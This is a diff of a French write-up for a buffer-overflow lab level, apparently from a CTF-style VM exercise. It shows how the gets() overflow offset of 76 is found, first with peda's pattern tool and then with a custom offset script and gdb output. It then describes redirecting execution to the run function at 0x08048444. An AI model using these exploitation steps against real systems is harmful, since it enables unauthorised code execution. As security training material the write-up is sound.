@@ -79,14 +79,21 @@
     ```
     <!-- - `(python -c 'print("\xef\xbe\xad\xde")' ; cat) | ./level1` -->
 
-  - Pour exploiter la faille de la fonction gets, trouver quelle taille permet d'overflow le buffer :
-    - Créer un pattern avec la fonction `pattern create 100` de peda.
-    - Lancer le programme avec le pattern sur l'entrée standard :
-      
-      `run < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")')`
-      On obtient bien le segfault attendu.
-    - Chercher l'emplacement du pattern en mémoire avec `pattern search` :
-        > EIP+0 found at offset: 76
+  - Pour exploiter la faille de la fonction gets, nous devons trouver quelle taille permet d'overflow le buffer :
+    - On utilise une  longue chaîne de caractères générée par notre fonction `string_generate`  puis en donnant en paramètre l'adresse de segmentation fault, notre programme `get_offset` nous envoie la taille de l'offset: 
+    ```bash
+    Breakpoint 1, 0x08048480 in main ()
+    (gdb) c
+    Continuing.
+    aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+    Program received signal SIGSEGV, Segmentation fault.
+    0x74747474 in ?? ()
+
+    python3 get_offset.py 0x74747474
+    offset = 76
+	```
+  > Note: Nous avons créé notre propre programme pour trouver la valeur de l'offset, mais il existe des outils permettant de le faire. Pour les prochains levels nous utiliserons l'outil `pattern` de `peda`.
+
 
 - Dans la Vm :
   - générer une chaine de 76 caractères suivie de l'adresse de la fonction `run` (0x08048444 inversée car système little endian) et la passer sur l'entrée standard du programme :
@@ -130,3 +137,4 @@
 <!-- - [PLT call in ELF programm](https://stackoverflow.com/questions/25667205/what-exactly-does-putsplt-mean) -->
 <!-- - [RELRO - Memory Corruption Mitigation Technique](https://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html) -->
 <!-- - [Mémoire - protection : RELRO](https://www.root-me.org/fr/Documentation/Applicatif/Memoire-protection-RELRO) -->
+
